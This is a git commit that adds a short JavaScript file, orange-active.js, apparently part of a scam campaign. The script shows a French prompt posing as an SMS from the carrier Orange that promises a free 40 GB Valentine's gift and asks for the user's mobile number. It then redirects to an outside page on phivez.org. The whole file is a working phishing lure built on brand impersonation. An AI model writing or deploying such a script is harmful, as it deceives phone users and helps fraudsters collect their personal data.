794d6e5ae9061d3ea0e119149b5b3e79f18136e4
newblog13 <sweet16guyz@gmail.com>
2026-02-07 17:38:42 +0100

    Create orange-active.js

---
+++ orange-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 40 Go'
+password=prompt('SMS: Félicitations, votre numéro Orange est éligible pour recevoir un cadeau de Saint-Valentin de 40 Go. Cliquez sur OK pour saisir votre numéro de mobile.','ACTIVER 40 Go');
+if (password != 'ACTIVER 40 Go') {
+location.href='https://phivez.org/orange-valentine.html';
+}
